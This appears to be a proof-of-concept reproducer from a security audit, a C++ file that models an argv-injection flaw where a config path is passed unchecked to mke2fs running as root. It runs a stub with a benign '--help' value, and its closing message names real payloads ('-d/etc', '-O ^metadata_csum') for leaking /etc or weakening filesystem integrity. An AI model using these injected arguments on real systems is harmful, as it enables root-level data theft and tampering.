// F03 — mke2fs argv-injection reproducer (non-weaponized).
//
// Models proc.cpp:441 with a stub mke2fs that prints argv.
// Build:
//   g++ -O2 -o repro repro.cpp
//   g++ -O2 -o stub_mke2fs ../finding-02-rsync/stub_rsync.cpp   # any argv printer works
//   mkdir -p ./fakebin && cp stub_mke2fs ./fakebin/mke2fs
//   PATH=$PWD/fakebin:$PATH ./repro
//
// Benign payload: path = "--help". No filesystem is created.

#include <stdio.h>
#include <unistd.h>
#include <sys/wait.h>
#include <string>

static void VulnerableSpawn(const std::string& type, const std::string& path) {
    pid_t pid = fork();
    if (pid == 0) {
        execlp("mke2fs", "mke2fs", "-F", "-q", "-t",
               type.c_str(), path.c_str(), (char*)nullptr);
        perror("execlp");
        _exit(127);
    }
    int st = 0;
    waitpid(pid, &st, 0);
}

int main() {
    fprintf(stderr,
        "[*] F03 reproducer — modelling proc.cpp:441 with a stub mke2fs.\n"
        "[*] Attacker-controlled config:\n"
        "[*]   type = \"ext4\"\n"
        "[*]   path = \"--help\"   (benign payload)\n\n");

    VulnerableSpawn("ext4", "--help");

    fprintf(stderr,
        "\n[*] In production, replace `--help` with `-d/etc` to read /etc into\n"
        "    a filesystem image (confidentiality leak), or `-O ^metadata_csum`\n"
        "    to weaken FS integrity. Both run as uid 0 because the caller is\n"
        "    `TrySetUid(0)`-d.\n");
    return 0;
}
